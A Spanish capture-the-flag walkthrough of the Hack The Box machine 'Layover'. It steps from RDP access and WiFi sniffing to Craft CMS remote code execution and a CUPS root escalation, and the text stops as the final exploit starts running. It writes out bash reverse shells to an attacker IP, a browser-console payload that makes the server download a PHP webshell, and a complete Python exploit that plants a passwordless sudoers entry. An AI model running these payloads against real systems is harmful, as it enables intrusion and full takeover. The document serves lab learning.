## Resumen ejecutivo

Obtuve acceso root completo a la máquina **Layover** (Hack The Box, dificultad Media) siguiendo una cadena de diez fases que comenzó con credenciales de contratista válidas sobre RDP y terminó con una escalada de privilegios local contra CUPS. El punto de entrada no fue la superficie de red expuesta directamente, sino un **pivote hacia una red WiFi interna** accesible únicamente desde dentro del host inicial, cuyo tráfico HTTP sin cifrar filtró credenciales de un segundo usuario.

Con esas credenciales accedí a un panel de administración de **Craft CMS 5.9.8**, que resultó vulnerable a un bypass de parche que habilita ejecución remota de comandos (**CVE-2026-28695**). Usé esa RCE para desplegar una webshell, pivotear a un usuario del sistema (`aporter`) vía credenciales cifradas en base de datos, y finalmente escalar a `root` explotando una vulnerabilidad de autenticación local en **CUPS 2.4.16** (**CVE-2026-34990**) que permite escritura de archivos arbitrarios como root.

**Vulnerabilidades explotadas:**

|   |   |   |   |
|---|---|---|---|
|#|Vulnerabilidad|Componente|Impacto|
|1|Tráfico HTTP sin cifrar sobre WiFi abierta|Red WiFi interna|Divulgación de credenciales|
|2|CVE-2026-28695|Craft CMS 5.9.8|RCE autenticado (post-login)|
|3|Secretos cifrados recuperables con clave expuesta|Yii Security / `.env`|Escalada lateral (`aporter`)|
|4|CVE-2026-34990|CUPS 2.4.16|Escalada de privilegios local a root|

## Información de la máquina

|   |   |
|---|---|
|Campo|Valor|
|Plataforma|Hack The Box|
|Máquina|Layover (Season 12)|
|Sistema operativo|Linux|
|Dificultad|Media|
|IP objetivo durante el escaneo|`10.129.247.82` (la IP de la instancia puede cambiar)|
|Dominio|`layover.htb`|
|IP atacante (VPN HTB)|`10.10.14.204`|
|Credenciales iniciales|`contractor` / `Contractor2026!` (provistas, escenario de pentest realista)|

## Diagrama de flujo del ataque

```mermaid
flowchart LR
    A["1. RDP como contractor"] --> B["2. Asociar airside-ws01 a la WiFi interna"]
    B --> C["3. Capturar credenciales HTTP de jenny"]
    C --> D["4. Iniciar sesión en Craft CMS"]
    D --> E["5. RCE en Craft CMS (CVE-2026-28695)"]
    E --> F["6. Leer secretos de .env y MariaDB"]
    F --> G["7. Descifrar la contraseña de aporter"]
    G --> H["8. SSH como aporter y obtener user.txt"]
    H --> I["9. Explotar CUPS (CVE-2026-34990)"]
    I --> J["10. Obtener root y root.txt"]
```



El diagrama resume los diez pasos principales. La cadena también requiere reconocimiento, pivoting y post-explotación para llegar a las dos vulnerabilidades con CVE asignado (RCE en Craft CMS y LPE en CUPS).

## Fase 1 — Reconocimiento

Inicié el compromiso con un escaneo completo de puertos TCP sobre el objetivo, usando detección de versión y scripts por defecto:

```bash
sudo nmap -p- --min-rate=5000 -sCV -T4 10.129.247.82 -oN scan_layover.txt

Nmap scan report for layover.htb (10.129.247.82)
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

**Análisis de la superficie expuesta:**

- **Puerto 3389 en un host Linux.** El `Service Info` reporta simultáneamente `Linux, Windows`, firma característica de **xrdp** (la implementación de RDP sobre Linux), que Nmap no logra atribuir a un único sistema operativo por la forma en que anuncia sus capacidades.
- **Ausencia total de HTTP/HTTPS.** El escaneo completo (`-p-`) no reveló servicios web en ningún puerto, descartando por el momento un vector de ataque web clásico contra el host directamente expuesto.
- Nmap resolvió el hostname `layover.htb` de forma automática, confirmando que ya tenía la entrada correspondiente mapeada localmente.

Con el puerto RDP como único vector de entrada viable, profundicé el reconocimiento específicamente sobre ese servicio para caracterizar la capa de seguridad que implementa:

```bash
nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption -oN nmap_rdp.txt 10.129.247.82

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 01:22 -0400
Nmap scan report for layover.htb (10.129.247.82)
Host is up (0.16s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     Native RDP: SUCCESS
|     RDSTLS: SUCCESS
|     SSL: SUCCESS
|   RDP Encryption level: High
|     128-bit RC4: SUCCESS
|_  RDP Protocol Version:  RDP 5.x, 6.x, 7.x, or 8.x server
```

El servidor soporta múltiples mecanismos de negociación (CredSSP/NLA, RDSTLS, SSL nativo) con cifrado de nivel alto — una configuración estándar que no presenta debilidades de protocolo explotables directamente, por lo que el siguiente paso lógico fue intentar autenticación con las credenciales de contratista que me fueron entregadas como punto de partida del escenario.

## Fase 2 — Acceso inicial vía RDP

Me conecté al servidor RDP usando `xfreerdp` con las credenciales de contratista provistas:

```bash
xfreerdp /v:10.129.118.255 /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution
```

**Nota sobre la IP:** el escaneo inicial de estas notas se hizo contra `10.129.247.82`, mientras que el comando de conexión RDP registrado usa `10.129.118.255`. Las IP de las instancias de HTB pueden cambiar al reiniciarlas; verifica la IP activa antes de reproducir los comandos.

|   |   |   |
|---|---|---|
|Parámetro|Significado|Justificación|
|`/v:10.129.118.255`|Dirección del servidor RDP|Obligatorio, indica a xfreerdp a dónde conectarse|
|`/u:contractor`|Usuario de autenticación|Evita el prompt interactivo de usuario|
|`/p:'Contractor2026!'`|Contraseña del usuario|Entre comillas simples porque `!` dispara _history expansion_ en bash sin ellas|
|`/cert:ignore`|Omite validación del certificado TLS|El servidor usa un certificado autofirmado (CN `jumpbox.lxd`); aceptable en un entorno de laboratorio controlado, nunca en producción|
|`/dynamic-resolution`|Ajusta la resolución de la sesión dinámicamente|Comodidad operativa, sin impacto en el vector de ataque|

La autenticación fue exitosa, obteniendo una sesión gráfica completa como `contractor` dentro del host `airside-ws01`. Con acceso interactivo confirmado, pasé a enumerar la configuración de red del workstation para entender qué otras redes eran alcanzables desde este punto:

```bash
ip addr
ip route
```

Esta enumeración perseguía dos objetivos concretos: identificar en `ip addr` todas las interfaces de red presentes (prestando especial atención a adaptadores inalámbricos desconectados o sin IP asignada) y, con `ip route`, establecer una línea base de qué subredes eran alcanzables _antes_ de tocar cualquier configuración adicional. Esta enumeración reveló la presencia de interfaces WiFi (`wlan2`, `wlan3`) sin asociar a ninguna red — el primer indicio de que el vector de ataque pasaba por un pivote inalámbrico, algo atípico para un escenario de pentesting interno tradicional pero coherente con la temática aeroportuaria de la máquina.

## Fase 3 — Pivote a la red WiFi interna

Desde la sesión RDP, asocié la interfaz `wlan2` a la red inalámbrica detectada:

```bash
nmcli device wifi connect "HTB International WiFi" ifname wlan2
```

- `nmcli device wifi connect "<SSID>"` indica a NetworkManager que se asocie a esa red.
- `ifname wlan2` especifica explícitamente la interfaz física a usar — crítico en este caso porque el host expone dos adaptadores WiFi (`wlan2`, `wlan3`), y sin este parámetro NetworkManager elige uno arbitrariamente.

```bash
contractor@airside-ws01:~$ nmcli device wifi connect "HTB International WiFi" ifname wlan2
Device 'wlan2' successfully activated with '7aa5b6cd-b241-4896-980f-5ca183b1bd62'.
contractor@airside-ws01:~$ ip addr show wlan2
6: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
    inet 10.13.37.182/24 brd 10.13.37.255 scope global dynamic noprefixroute wlan2
       valid_lft 43153sec preferred_lft 43153sec
    inet6 fe80::d9b2:f7b5:1df0:51ae/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

La asociación fue exitosa y obtuve una dirección por DHCP (`10.13.37.182/24`), exponiéndome a una subred completamente nueva (`10.13.37.0/24`) inalcanzable desde fuera del host `airside-ws01`. Este es el patrón de diseño central de la máquina: la infraestructura crítica (el portal de Craft CMS) vive exclusivamente en esta red interna, simulando un entorno de red aeroportuaria segmentada a la que solo se accede físicamente conectándose a la WiFi del terminal.

## Fase 4 — Shell reversa y estabilización

Para trabajar cómodamente desde mi propia terminal en lugar de la GUI de RDP, lancé una shell reversa desde `contractor` hacia mi equipo atacante:

```bash
bash -i >& /dev/tcp/10.10.14.204/4444 0>&1
```

Una vez recibida la conexión en mi listener (`nc -lvnp 4444`), estabilicé la TTY para obtener una shell completamente interactiva:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
stty raw -echo; fg
```

Y ya en la shell remota:

```bash
export TERM=xterm
```

De esta forma dispuse de una terminal estable con autocompletado, control de trabajos e historial funcional, condición necesaria para las siguientes fases de enumeración y explotación.

## Fase 5 — Descubrimiento del portal cautivo

Enumeré qué otras redes veía la interfaz WiFi y qué servicios locales estaban escuchando en el host:

```bash
nmcli device wifi list
ss -tulnp
```

Busqué después una pista de configuración relevante: la política de Chromium instalada en el sistema, pensada para simular el comportamiento de un portal cautivo de aeropuerto al abrir el navegador:

```bash
cat /etc/chromium/policies/managed/layover-portal.json
```

Este archivo reveló la URL de destino configurada como página de inicio forzada del navegador — `HomepageLocation: http://wifi.international.htb/` — confirmando la existencia de un portal web accesible únicamente desde esta red interna. Resolví el hostname y verifiqué conectividad:

```bash
nslookup wifi.international.htb
ping 10.13.37.1
```

El dominio resolvió a `10.13.37.1`, el gateway de la subred. Consultando ese host por HTTP:

```bash
curl -v http://10.13.37.1/
```

Obtuve una landing page estática de bienvenida (`SimpleHTTP/0.6 Python/3.12.3`) que incluía un enlace al verdadero sistema de la aerolínea: `http://portal.international.htb/`, junto con una nota adicional dirigida a personal de HTB Airways sobre un portal de empleados en `http://portal.international.htb/miles/`. Resolví ese segundo hostname y confirmé qué aplicación corría detrás:

```bash
nslookup portal.international.htb
curl -sI http://portal.international.htb/admin
curl -sI http://portal.international.htb/miles/
```

`portal.international.htb` resolvió a `10.13.37.10`. La petición a `/admin` devolvió un `302 Found` hacia `/admin/login` con la cabecera `X-Powered-By: Craft CMS`, identificando positivamente el backend como **Craft CMS**, corriendo detrás de nginx 1.24.0. Esto fijó mi siguiente objetivo: conseguir credenciales válidas para ese panel de administración.

## Fase 6 — Interceptación de credenciales sobre WiFi abierta

La red `HTB International WiFi` no implementa cifrado (`key_mgmt=NONE` en la configuración de `wpa_supplicant` del sistema), lo que significa que **todo el tráfico 802.11 viaja en claro a nivel de enlace** y es interceptable por cualquier cliente asociado a la misma red. Aproveché la segunda interfaz inalámbrica disponible (`wlan3`) para ponerla en modo monitor y capturar ese tráfico:

```bash
iw dev
ip link show
```

```bash
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
```

Confirmé el cambio de modo:

```bash
iw dev
```

Y lancé la captura de tráfico HTTP (puerto 80) en segundo plano:

```bash
tshark -i wlan3 -f "tcp port 80" -w /tmp/layover.pcap &
```

El entorno de laboratorio genera tráfico simulado periódicamente (usuarios autenticándose contra el portal), así que dejé la captura corriendo y verifiqué su crecimiento:

```bash
ls -la /tmp/layover.pcap
```

Una vez capturado tráfico, filtré específicamente las peticiones `POST` HTTP y extraje el cuerpo de la petición:

```bash
tshark -r /tmp/layover.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

El resultado fue el payload de un formulario de login en formato hexadecimal, que decodifiqué directamente:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Layover]
└─$ echo '757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621' | xxd -r -p
username=jenny&password=Fl1ghtDeck2026!   
```

Esto me dio un par de credenciales válidas en texto claro: **`jenny` / `Fl1ghtDeck2026!`**. Este hallazgo ilustra un riesgo real en infraestructuras WiFi de uso público: sin cifrado a nivel de enlace, un atacante en la misma red puede interceptar credenciales de cualquier aplicación que no implemente HTTPS de extremo a extremo.

## Fase 7 — Explotación de Craft CMS (CVE-2026-28695)

Con las credenciales interceptadas, inicié sesión en `http://portal.international.htb/admin/login` como `jenny` desde Chromium (dentro de la sesión RDP, única vía con ruta de red hacia `10.13.37.0/24`). El panel confirmó la versión exacta del stack:

```
PHP version	8.3.6
OS version	Linux 6.8.0-142-generic
Database driver & version	MariaDB 10.11.14
Image driver & version	Imagick 3.7.0 (ImageMagick 6.9.12-98)
Craft edition & version	Craft Solo 5.9.8
Yii version	2.0.54
Twig version	v3.21.1
Guzzle version	7.14.2
```

Craft CMS 5.9.8 es vulnerable a **CVE-2026-28695**, un bypass del parche original que habilita RCE a través del endpoint de búsqueda de elementos (`element-search`), abusando de la deserialización de condiciones de elementos para forzar un _type-cast_ malicioso que termina invocando `exec()` sobre una clase de consola (`Psy\Readline\Hoa\ConsoleProcessus`). Primero levanté un servidor HTTP local en mi Kali para servir una webshell PHP mínima:

```bash
cd ~/Desktop/HTB/Layover
python3 -m http.server 8000
```

```bash
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

**Nota operativa:** este servidor terminó reubicado en `airside-ws01` (la máquina con ruta directa a `10.13.37.0/24`), no en mi Kali — el portal Craft CMS no tiene conectividad hacia la VPN de HTB, solo hacia su propia subred interna.

Abrí la consola de JavaScript del navegador sobre la sesión autenticada (`Ctrl+Shift+J`), autoricé el pegado de código (`allow pasting`), y validé la vulnerabilidad con una prueba de _timing_ no destructiva antes de ejecutar nada real — un `sleep 8` server-side:

```javascript
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
    condition: { class: "craft\\elements\\conditions\\ElementCondition", elementType: "craft\\elements\\Category",
      fieldLayouts: [ { "as rce": { "__class": "yii\\behaviors\\AttributeTypecastBehavior",
        "__construct()": [ { attributeTypes: { typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"] },
        typecastBeforeSave: "sleep 8" } ] }, "on *": "self::beforeSave" } ] } };
  const url='/index.php?p=admin/actions/element-search/search';
  const t0 = performance.now();
  const r = await fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json','X-CSRF-Token':csrf},body:JSON.stringify(b)});
  return `status=${r.status} elapsed=${Math.round(performance.now()-t0)}ms`;
})()
```

La respuesta llegó en **~8124 ms**, confirmando ejecución de comandos del lado del servidor (el `500 Internal Server Error` devuelto es cosmético — Yii captura la excepción posterior pero el comando ya se ejecutó). Con la primitiva validada, ejecuté el comando real para que el servidor descargara mi webshell y sobrescribiera el `index.php` del portal:

```javascript
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const fire = (cmd) => {
    const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
      condition: { class: "craft\\elements\\conditions\\ElementCondition", elementType: "craft\\elements\\Category",
        fieldLayouts: [ { "as rce": { "__class": "yii\\behaviors\\AttributeTypecastBehavior",
          "__construct()": [ { attributeTypes: { typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"] },
          typecastBeforeSave: cmd } ] }, "on *": "self::beforeSave" } ] } };
    const url='/index.php?p=admin/actions/element-search/search';
    const t0 = performance.now();
    return fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json','X-CSRF-Token':csrf},body:JSON.stringify(b)})
      .then(r=>r.text().then(t=>({status:r.status, ms: Math.round(performance.now()-t0), head:t.slice(0,60)})));
  };
  const timed = await fire("curl http://10.13.37.182:8000/shell.php --output /var/www/portal/web/index.php");
  return JSON.stringify({timed});
})()
```

Verifiqué la ejecución accediendo directamente a la webshell desplegada:

```bash
curl "http://portal.international.htb/index.php?cmd=id"
```

Obtuve confirmación de ejecución de comandos como `www-data`. Para trabajar con una shell interactiva en vez de repetir peticiones `curl`, lancé un listener en `airside-ws01` (el único host con ruta tanto a la subred interna como a mi entorno de trabajo) y disparé una reverse shell desde la webshell apuntando a esa IP intermedia:

```bash
curl "http://portal.international.htb/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.13.37.182/4445+0>%261'"
```

Con el `nc -lvnp 4445` esperando en `airside-ws01`, recibí la shell interactiva como `www-data` en el portal, usando `airside-ws01` como _pivot/relay_ entre la red interna del portal y mi espacio de trabajo.

## Fase 8 — Post-explotación: extracción y desencriptado de credenciales

Con shell interactiva como `www-data`, inspeccioné el archivo de configuración de entorno de Craft CMS, donde las aplicaciones Yii suelen almacenar secretos sensibles:

```bash
cd /var/www/portal
cat .env
# General settings
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DEV_MODE=false
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_DISALLOW_ROBOTS=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://portal.international.htb/
CRAFT_ENABLE_TWIG_SANDBOX=true
www-data@portal:~/portal$ cat /etc/passwd | grep -v nologin
grep -vE 'nologin|/bin/false' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:106:1::/var/cache/pollinate:/bin/false
mysql:x:110:112:MariaDB Server,,,:/nonexistent:/bin/false
aporter:x:1001:1001::/home/aporter:/bin/bash
```

Este archivo me dio dos datos críticos: credenciales directas de la base de datos MariaDB (`craftuser` / `CraftDB_pw_2026`) y la `CRAFT_SECURITY_KEY`, la clave simétrica que Yii usa para cifrar/descifrar secretos almacenados en base de datos mediante su clase `yii\base\Security`. El listado de `/etc/passwd` confirmó además la existencia de un usuario del sistema no estándar: `aporter`.

Consulté la base de datos buscando secretos de aplicación gestionados por un _plugin_ propio de la aerolínea (`htbairways_settings`):

```bash
mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft -e "SELECT * FROM htbairways_settings;"

id	name	value	dateCreated	dateUpdated
1	mailRelayPassword	u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=	2026-07-16 03:19:52	2026-07-16 03:19:52
2	mailRelayHost	mail.htbairways.htb	2026-08-11 13:31:23	2026-08-11 13:31:23
3	mailRelayPort	587	2026-08-11 13:31:23	2026-08-11 13:31:23
4	mailRelayUser	aporter	2026-08-11 13:31:23	2026-08-11 13:31:23
```

La fila `mailRelayPassword` contenía un blob cifrado, y `mailRelayUser` confirmaba que correspondía precisamente al usuario `aporter` identificado antes. Desencripté el blob reutilizando la propia clase `Security` de Yii, cargando el autoloader de Composer del proyecto directamente desde la shell (aprovechando que estaba parado en el mismo filesystem de la aplicación):

```bash
php -r 'require "/var/www/portal/vendor/autoload.php"; $s = new yii\base\Security(); $key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr"; $blob = "u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w="; echo $s->decryptByKey(base64_decode($blob), $key), "\n";'
```

El resultado fue la contraseña en claro: **`Skyp0rt_Relay!26`** — credenciales válidas de nivel de sistema para el usuario `aporter`.

## Fase 9 — Movimiento lateral vía SSH

Con credenciales válidas de sistema, me conecté por SSH a `portal.international.htb` como `aporter` desde `airside-ws01` (único host con ruta a esa subred):

```bash
contractor@airside-ws01:~$ ssh aporter@portal.international.htb
The authenticity of host 'portal.international.htb (10.13.37.10)' can't be established.
ED25519 key fingerprint is SHA256:3zC8PGwDfCgcR1KjYS3E5WmhpZlk+tdqTI47GLwTS1k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'portal.international.htb' (ED25519) to the list of known hosts.
aporter@portal.international.htb's password: 
aporter@portal:~$ ls
user.txt
aporter@portal:~$ cat user.txt 
670d716d1924f23d1d808a65a7272c73
```

Autenticación exitosa y **flag de usuario capturada**: `670d716d1924f23d1d808a65a7272c73`. Con acceso de nivel de sistema como `aporter`, el objetivo pasó a ser la escalada de privilegios local hasta `root`.

## Fase 10 — Escalada de privilegios: CUPS (CVE-2026-34990)

Verifiqué permisos de sudo y la versión del servicio de impresión CUPS, un componente que suele correr con privilegios de root:

```bash
aporter@portal:~$ sudo -l  
cups-config --version  
[sudo] password for aporter:  
Sorry, try again.  
[sudo] password for aporter:  
Sorry, user aporter may not run sudo on portal.  
2.4.16
```

`aporter` no tiene permisos de sudo configurados, pero confirmé **CUPS 2.4.16**, versión vulnerable a **CVE-2026-34990**: una escalada de privilegios local por autenticación deficiente en el daemon `cupsd`. El fallo permite a un usuario sin privilegios:

1. Forzar a `cupsd` a autenticarse contra un servidor IPP controlado por el atacante en `localhost`, filtrando así su token de sesión `Authorization: Local <token>` (reutilizable).
2. Reutilizar ese token para invocar `CUPS-Create-Local-Printer` y registrar una impresora cuyo `device-uri` apunta a un archivo arbitrario del sistema (`file:///etc/sudoers.d/<usuario>`).
3. Enviar un trabajo de impresión (`Print-Job`) con datos comprimidos en gzip; `cupsd` los descomprime y los **escribe directamente en esa ruta como root**, sin pasar por el backend tradicional de impresoras.
4. Ganar la condición de carrera entre la creación/activación de la impresora y el envío del trabajo es lo que determina si la escritura se concreta antes de que CUPS invalide el estado de la cola.

Desarrollé un PoC en Python que implementa el protocolo IPP (Internet Printing Protocol) manualmente sobre sockets TCP, sin depender de `ipptool`:

```python
cat > /tmp/cups_exploit.py << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, threading, time, os, gzip
HOST="127.0.0.1"; CUPS_PORT=631; CAPTURE_PORT=9189
TARGET="/etc/sudoers.d/aporter"; PRINTER=f"cve34990_{os.getpid()}"
TAG_OPERATION=0x01; TAG_PRINTER=0x04; TAG_END=0x03
TAG_BOOLEAN=0x22; TAG_NAME=0x42; TAG_KEYWORD=0x44
TAG_URI=0x45; TAG_CHARSET=0x47; TAG_LANGUAGE=0x48; TAG_MIMETYPE=0x49
OP_PRINT_JOB=0x0002; OP_CUPS_ADD_MODIFY_PRINTER=0x4003
OP_CUPS_DELETE_PRINTER=0x4004; OP_CUPS_CREATE_LOCAL_PRINTER=0x4028

def attr(t,n,v):
    n=n.encode(); v=v.encode()
    return bytes([t])+struct.pack(">H",len(n))+n+struct.pack(">H",len(v))+v

def raw_attr(t,n,v):
    n=n.encode()
    return bytes([t])+struct.pack(">H",len(n))+n+struct.pack(">H",len(v))+v

def boolean(n,v): return raw_attr(TAG_BOOLEAN,n,b"\x01" if v else b"\x00")

def ipp(op,reqid,oa,pa=None,doc=b""):
    b=bytearray(struct.pack(">BBHI",2,0,op,reqid)); b.append(TAG_OPERATION)
    for x in oa: b.extend(x)
    if pa:
        b.append(TAG_PRINTER)
        for x in pa: b.extend(x)
    b.append(TAG_END); b.extend(doc); return bytes(b)

def common():
    return [attr(TAG_CHARSET,"attributes-charset","utf-8"),
            attr(TAG_LANGUAGE,"attributes-natural-language","en"),
            attr(TAG_NAME,"requesting-user-name",os.getenv("USER","user"))]

def http_post(path,body,token=None):
    h=[f"POST {path} HTTP/1.1",f"Host: {HOST}:{CUPS_PORT}",
       "Content-Type: application/ipp",f"Content-Length: {len(body)}",
       "Connection: close"]
    if token: h.append(f"Authorization: Local {token}")
    req=("\r\n".join(h)+"\r\n\r\n").encode()+body
    with socket.create_connection((HOST,CUPS_PORT),timeout=2) as s:
        s.sendall(req); data=b""
        while True:
            try:
                c=s.recv(65535)
                if not c: break
                data+=c
            except socket.timeout: break
        return data

class CaptureServer(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True); self.token=None
    def run(self):
        with socket.socket() as s:
            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            s.bind((HOST,CAPTURE_PORT)); s.listen(5); s.settimeout(0.5)
            end=time.time()+15
            while time.time()<end and not self.token:
                try: conn,_=s.accept()
                except socket.timeout: continue
                with conn:
                    conn.settimeout(3); data=b""
                    while b"\r\n\r\n" not in data:
                        c=conn.recv(4096)
                        if not c: break
                        data+=c
                    for line in data.decode("latin1","ignore").splitlines():
                        if line.lower().startswith("authorization: local "):
                            self.token=line.split(None,2)[2]; break
                    if self.token:
                        body=(b"\x02\x00\x00\x01" b"\x01"
                              b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                              b"\x48\x00\x1battributes-natural-language\x00\x02en"
                              b"\x03")
                        reply=(b"HTTP/1.1 200 OK\r\n"
                               b"Content-Type: application/ipp\r\n"
                               +f"Content-Length: {len(body)}\r\n".encode()
                               +b"Connection: close\r\n\r\n"+body)
                    else:
                        reply=(b'HTTP/1.1 401 Unauthorized\r\n'
                               b'WWW-Authenticate: Local trc="y"\r\n'
                               b'Content-Length: 0\r\nConnection: close\r\n\r\n')
                    conn.sendall(reply)

def capture_token():
    print("[*] Starting token capture server...")
    s=CaptureServer(); s.start()
    body=ipp(OP_CUPS_CREATE_LOCAL_PRINTER,1,
             common()+[attr(TAG_URI,"printer-uri","ipp://localhost:631/")],
             [attr(TAG_NAME,"printer-name","tokenleak"),
              attr(TAG_URI,"device-uri",f"ipp://{HOST}:{CAPTURE_PORT}/ipp/print")])
    http_post("/",body); s.join(5)
    if not s.token: raise RuntimeError("No token captured.")
    print(f"[+] Captured Local token: {s.token}"); return s.token

def printer_uri(n): return f"ipp://localhost:631/printers/{n}"

def create_file_printer():
    body=ipp(OP_CUPS_CREATE_LOCAL_PRINTER,2,
             common()+[attr(TAG_URI,"printer-uri","ipp://localhost:631/")],
             [attr(TAG_NAME,"printer-name",PRINTER),
              attr(TAG_URI,"device-uri",f"file://{TARGET}")])
    s=socket.create_connection((HOST,CUPS_PORT),timeout=2)
    req=(f"POST / HTTP/1.1\r\nHost: {HOST}:{CUPS_PORT}\r\n"
         f"Content-Type: application/ipp\r\nContent-Length: {len(body)}\r\n"
         f"Connection: keep-alive\r\n\r\n").encode()+body
    s.sendall(req); return s

def admin(token,op,reqid,attrs=None):
    body=ipp(op,reqid,
             common()+[attr(TAG_URI,"printer-uri",printer_uri(PRINTER))],attrs)
    return http_post("/admin/",body,token)

def print_test(token):
    payload=b"aporter ALL=(ALL) NOPASSWD: ALL\n"
    doc=gzip.compress(payload)
    body=ipp(OP_PRINT_JOB,5000,
             common()+[attr(TAG_URI,"printer-uri",printer_uri(PRINTER)),
                       attr(TAG_MIMETYPE,"document-format","application/vnd.cups-raw"),
                       attr(TAG_KEYWORD,"compression","gzip"),
                       attr(TAG_NAME,"job-name","cve34990-proof")],
             doc=doc)
    http_post(f"/printers/{PRINTER}",body,token)

def exploit(token):
    print("[*] Creating file:// printer...")
    sock=create_file_printer()
    try:
        for i in range(1000):
            reqid=1000+i*10
            admin(token,OP_CUPS_ADD_MODIFY_PRINTER,reqid,
                  [attr(TAG_NAME,"ppd-name","raw"),
                   boolean("printer-is-shared",True)])
            try: print_test(token)
            except Exception: pass
            if os.path.exists(TARGET):
                print("[+] Vulnerable!")
                print(f"[+] File created: {TARGET}")
                print(f"[+] Owner: {os.stat(TARGET).st_uid}:{os.stat(TARGET).st_gid}")
                print("[+] Contents:")
                print(open(TARGET,"rb").read().decode(errors="replace"))
                return True
            time.sleep(0.01)
    finally: sock.close()
    return False

def cleanup(token):
    try: admin(token,OP_CUPS_DELETE_PRINTER,9000)
    except Exception: pass

if __name__=="__main__":
    print("CVE-2026-34990 CUPS PoC")
    print(f"[*] Target file: {TARGET}")
    try:
        t=capture_token()
        ok=exploit(t)
        print("[+] SUCCESS." if ok else "[-] Did not win the race.")
        cleanup(t)
    except Exception as e:
        print(f"[-] {e}")
PYEOF
```

**Explicación de los componentes del script:**

- **Codificación IPP manual** (`attr`, `raw_attr`, `ipp`): el protocolo IPP serializa cada atributo como un tag de tipo (1 byte) + nombre con longitud prefijada + valor con longitud prefijada. Construí las peticiones a mano para tener control total sobre la secuencia de operaciones, sin depender de que `ipptool` estuviera disponible en el objetivo.
- **`CaptureServer`**: un servidor TCP propio en el puerto `9189` que actúa de _rogue IPP server_. Cuando `cupsd` necesita validar una impresora con `device-uri` apuntando a esta dirección, intenta autenticarse contra ella — y en ese intento revela su cabecera `Authorization: Local <token>`, que interceptamos respondiendo primero con `401 Unauthorized` para forzar el reintento con credenciales.
- **`capture_token()`**: dispara la creación de una impresora señuelo (`tokenleak`) cuyo `device-uri` apunta al `CaptureServer` local, provocando la fuga del token.
- **`create_file_printer()`**: registra la impresora maliciosa real, con `device-uri=file:///etc/sudoers.d/aporter` — la primitiva central de la vulnerabilidad: CUPS permite declarar un dispositivo de salida que es, en realidad, un archivo arbitrario del sistema de archivos.
- **`exploit()`**: el núcleo de la condición de carrera — en bucle, reconfigura la impresora como compartida y lanza inmediatamente un trabajo de impresión con el payload de sudoers comprimido en gzip, verificando en cada iteración si el archivo objetivo ya existe.

**Resultado de la primera ejecución:**

```bash
aporter@portal:~$ python3 /tmp/cups_exploit.py
CVE-2026-34990 CUPS PoC
[*] Target file: /etc/sudoers.d/aporter
